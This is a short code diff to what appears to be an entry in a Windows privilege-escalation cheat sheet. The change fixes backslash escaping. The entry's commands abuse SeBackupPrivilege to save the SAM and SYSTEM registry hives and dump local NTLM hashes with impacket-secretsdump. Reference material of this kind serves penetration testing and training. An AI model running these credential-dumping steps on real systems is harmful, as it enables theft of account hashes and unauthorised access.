@@ -566,8 +566,8 @@ BUILTIN\\Users
     title: "SeBackupPrivilege",
     look: "The privilege is listed and Enabled. You can read files the ACL would otherwise deny, including a copy of the SAM. Disabled in the table means you do not have it.",
     cmd: `whoami /priv | findstr /i backup
-reg save hklm\sam C:\Users\Public\sam
-reg save hklm\system C:\Users\Public\system
+reg save hklm\\sam C:\\Users\\Public\\sam
+reg save hklm\\system C:\\Users\\Public\\system
 # copy both files to Kali
 impacket-secretsdump -sam sam -system system LOCAL`,
     alive: "Enabled and secretsdump prints local NTLM hashes.",
